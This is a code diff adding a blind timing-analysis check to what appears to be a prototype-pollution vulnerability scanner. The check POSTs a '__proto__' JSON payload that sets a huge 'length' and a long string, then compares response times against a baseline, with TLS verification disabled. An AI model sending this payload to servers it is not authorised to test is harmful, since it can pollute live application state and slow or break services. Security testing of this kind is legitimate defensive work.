@@ -35,9 +35,9 @@ class Tier1BlindScanner(BaseTierScanner):
         self.log_start(ctx)
         raw: List[Dict[str, Any]] = []
 
-        raw += self._test_json_spaces_overflow(ctx)
         raw += self._test_status_code_override(ctx)
         raw += self._test_function_prototype_chain(ctx)
+        raw += self._test_timing_analysis(ctx)
         raw += self._test_persistence_verification(ctx)
 
         findings = [self._to_finding(r, ctx.target_url) for r in raw]
@@ -236,6 +236,54 @@ class Tier1BlindScanner(BaseTierScanner):
 
         except Exception as e:
             print(f"{Colors.WARNING}[⚠] Persistence verification error: {str(e)[:80]}{Colors.ENDC}")
+
+        return findings
+
+    def _test_timing_analysis(self, ctx: ScanContext) -> List[Dict[str, Any]]:
+        """
+        Blind server-side PP detection via Timing Analysis.
+        Measures baseline request time, injects a computationally heavy parameter
+        via prototype pollution, and measures the delay.
+        """
+        print(f"{Colors.CYAN}[→] Testing blind timing analysis...{Colors.ENDC}")
+        findings: List[Dict[str, Any]] = []
+        session = ctx.session
+        target_url = ctx.target_url
+
+        try:
+            # Measure baseline multiple times to avoid network hiccups
+            baseline_times = []
+            for _ in range(3):
+                start = time.time()
+                session.get(target_url, timeout=5, verify=False)
+                baseline_times.append(time.time() - start)
+            
+            avg_baseline = sum(baseline_times) / len(baseline_times)
+            
+            # Payload designed to force internal iteration or regex delay
+            pollution_payload = {
+                "__proto__": {
+                    "length": 1000000, 
+                    "test_timing": "A" * 10000
+                }
+            }
+            start = time.time()
+            resp = session.post(target_url, json=pollution_payload, timeout=10, verify=False)
+            polluted_time = time.time() - start
+
+            # Analysis: if polluted time is significantly higher (margin of 1s or 3x slower)
+            if polluted_time > (avg_baseline * 3) and (polluted_time - avg_baseline) > 1.0:
+                findings.append({
+                    "type": "blind_pp_detected",
+                    "method": "TIMING_ANALYSIS",
+                    "severity": "MEDIUM",
+                    "description": "Server-side PP detected via Timing Analysis side-channel",
+                    "payload": pollution_payload,
+                    "indicator": f"Response delayed: ~{polluted_time:.2f}s (baseline: {avg_baseline:.2f}s)",
+                })
+                print(f"{Colors.WARNING}[!] MEDIUM: Blind PP via Timing Analysis ({polluted_time:.2f}s delay)!{Colors.ENDC}")
+        except Exception as e:
+            logger.debug(f"Timing analysis test error: {e}")
 
         return findings
 
